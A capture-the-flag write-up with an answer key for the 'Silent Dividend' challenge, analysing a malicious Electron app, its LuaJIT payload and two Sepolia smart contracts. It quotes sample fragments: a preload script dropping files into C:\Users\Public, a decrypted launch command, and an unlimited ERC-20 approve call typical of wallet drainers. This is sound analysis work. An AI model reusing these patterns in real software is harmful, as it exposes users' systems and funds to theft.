# Sherlock Holmes CTF 2026 – Silent Dividend

## Overview

**Challenge:** Silent Dividend  
**Event:** Sherlock Holmes CTF 2026  
**Category:** DFIR / Malware Analysis / Smart Contracts  

This challenge involved analyzing an Electron application, an embedded LuaJIT payload, a bundled HTML page, and two smart contracts deployed on the Sepolia test network.

The investigation moved through several stages:

```text
Electron App
   ↓
Extract app.asar
   ↓
Analyze preload.js
   ↓
Inspect LuaJIT payload
   ↓
Identify Win32 APIs
   ↓
Interact with Sepolia contract
   ↓
Decrypt payload
   ↓
Analyze settlement.html
   ↓
Reverse second smart contract
   ↓
Recover final flag
```

---

## Questions and Answers

| # | Question | Answer |
|---|---|---|
| 1 | Directory used for files from `extraResources` | `C:\Users\Public` |
| 2 | Win32 structure used for directory-change monitoring | `FILE_NOTIFY_INFORMATION` |
| 3 | Win32 API used to send HTTP requests | `WinHttpSendRequest` |
| 4 | Smart contract function used to retrieve decryption key | `resolveState()` |
| 5 | Decrypted payload result | `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821` |
| 6 | Environment variable used for settlement HTML | `%TEMP%` |
| 7 | Token function used to request spending permission | `approve()` |
| 8 | Exact approval amount | `115792089237316195423570985008687907853269984665640564039457584007913129639935` |
| 9 | ethers.js v6 wallet provider class | `BrowserProvider` |
| 10 | Final hidden value | `51.5049,0.0348` |

---

# 1. Electron Application Analysis

After extracting the Electron application, the main files of interest were:

- `app.asar`
- `preload.js`
- `extraResources`
- LuaJIT-related files
- `settlement.html`

The preload script contained logic that copied all files from the `extraResources` directory into:

```text
C:\Users\Public
```

Relevant code:

```javascript
fs.readdirSync(
    path.resolve(`${process.resourcesPath}/../extraResources`)
).forEach(f =>
    fs.copyFileSync(
        path.resolve(`${process.resourcesPath}/../extraResources`, f),
        path.join('C:\\Users\\Public', f)
    )
);
```

### Answer

```text
C:\Users\Public
```

---

# 2. Directory Change Monitoring

The Lua payload used Windows APIs through LuaJIT FFI.

The following structure was defined:

```c
typedef struct {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength;
    WCHAR FileName[1];
} FILE_NOTIFY_INFORMATION;
```

This structure is used with directory monitoring APIs such as `ReadDirectoryChangesW`.

### Answer

```text
FILE_NOTIFY_INFORMATION
```

---

# 3. HTTP Request API

The Lua script used the WinHTTP API.

The request flow included functions such as:

```text
WinHttpOpen
WinHttpConnect
WinHttpOpenRequest
WinHttpSendRequest
```

The API responsible for sending the request was:

```text
WinHttpSendRequest
```

### Answer

```text
WinHttpSendRequest
```

---

# 4. Smart Contract Decryption Key

Further inspection of the Electron code revealed a Sepolia smart contract:

```text
0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1
```

The application used the following function:

```solidity
function resolveState() view returns (bytes32)
```

The returned `bytes32` value was used as a decryption key.

### Answer

```text
resolveState()
```

---

# 5. Decrypting the Payload

The application contained this encrypted payload:

```text
560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca8
f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74cfa
2c4c4e1bbfc6204207fe5c801d201f5af84864f0
```

Using ethers.js, the `resolveState()` function was called.

```javascript
const { ethers } = require("ethers");

(async () => {
    const provider = new ethers.JsonRpcProvider(
        "https://ethereum-sepolia-rpc.publicnode.com"
    );

    const contract = new ethers.Contract(
        "0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1",
        ["function resolveState() view returns (bytes32)"],
        provider
    );

    const key = await contract.resolveState();
    console.log(key);
})();
```

The returned key was:

```text
0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

The decryption routine performed:

1. XOR encrypted byte with key byte
2. Rotate left by 7 bits
3. XOR with `0x42`

Equivalent implementation:

```javascript
const x = encrypted[i] ^ key[i % key.length];
const rotated = ((x << 7) | (x >>> 1)) & 0xff;
output[i] = rotated ^ 0x42;
```

The decrypted plaintext was:

```text
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

### Answer

```text
AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

---

# 6. Environment Variable

The decrypted payload revealed:

```text
"%TEMP%\settlement.html"
```

The challenge expected the environment variable in Windows syntax, including the `%` characters.

### Answer

```text
%TEMP%
```

---

# 7. ERC-20 Approval Function

The `settlement.html` page interacted with a token contract.

The page called:

```javascript
token.approve(...)
```

This is the standard ERC-20 approval function.

### Answer

```text
approve()
```

---

# 8. Approval Amount

The page used:

```javascript
ethers.MaxUint256
```

The approval call was:

```javascript
await token.approve(
    X0_CONTRACT_ADDRESS,
    ethers.MaxUint256
);
```

`MaxUint256` is:

```text
2^256 - 1
```

Decimal value:

```text
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

### Answer

```text
115792089237316195423570985008687907853269984665640564039457584007913129639935
```

---

# 9. Browser Wallet Provider

The HTML page connected to the browser wallet using:

```javascript
provider = new ethers.BrowserProvider(window.ethereum);
```

### Answer

```text
BrowserProvider
```

---

# 10. Second Smart Contract

The HTML referenced the contract:

```text
0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D
```

and the token:

```text
0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2
```

The page requested an unlimited token approval, but this was not required to recover the flag.

The smart contract runtime bytecode exposed several selectors:

```text
0x0bfac020
0x282940a7
0x343943bd
0x8f7f391e
0xf8e6e11f
```

---

## Hidden Address

Selector:

```text
0x282940a7
```

returned a value based on:

```text
storage[1] XOR storage[2]
```

The lower 20 bytes of the result formed a hidden Ethereum address.

Example:

```javascript
const rawSecret = await provider.call({
    to: target,
    data: "0x282940a7"
});

const hiddenAddress =
    ethers.getAddress("0x" + rawSecret.slice(-40));
```

---

## Reveal Function

Selector:

```text
0xf8e6e11f
```

accepted an address parameter.

The contract checked whether the provided address matched the hidden address.

Conceptually:

```solidity
require(
    suppliedAddress == hiddenAddress,
    "not quite - keep analyzing"
);
```

If the address was correct, the function decoded and returned the hidden data.

The final recovered result was:

```text
51.5049,0.0348
```

### Answer

```text
51.5049,0.0348
```

---

# Token Approval Observation

The HTML attempted to request an unlimited ERC-20 allowance:

```javascript
token.approve(
    X0_CONTRACT_ADDRESS,
    ethers.MaxUint256
);
```

Reverse engineering showed that the contract contained logic capable of using `transferFrom()`.

This made the approval flow suspicious.

For the purpose of the challenge, no approval or wallet transaction was actually required.

The flag could be recovered entirely through read-only smart contract calls.

---

# Final Answers

```text
1. C:\Users\Public

2. FILE_NOTIFY_INFORMATION

3. WinHttpSendRequest

4. resolveState()

5. AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821

6. %TEMP%

7. approve()

8. 115792089237316195423570985008687907853269984665640564039457584007913129639935

9. BrowserProvider

10. 51.5049,0.0348
```

---

# Conclusion

Silent Dividend combined multiple areas of analysis:

- Electron application extraction
- JavaScript reverse engineering
- LuaJIT FFI analysis
- Windows API analysis
- Custom payload decryption
- Ethereum RPC interaction
- EVM bytecode analysis
- ERC-20 permission analysis

The most interesting part of the challenge was the transition from traditional malware-style analysis into blockchain reverse engineering.

The final attack chain was:

```text
Electron Application
        ↓
Extract app.asar
        ↓
Analyze preload.js
        ↓
Recover LuaJIT payload
        ↓
Identify Windows APIs
        ↓
Find Sepolia contract
        ↓
Call resolveState()
        ↓
Decrypt embedded payload
        ↓
Locate settlement.html
        ↓
Analyze ERC-20 approval
        ↓
Identify second smart contract
        ↓
Reverse contract bytecode
        ↓
Derive hidden address
        ↓
Call reveal function
        ↓
Recover final coordinates
```

Silent Dividend was a good example of a multi-stage challenge where each artifact revealed the next stage of the investigation.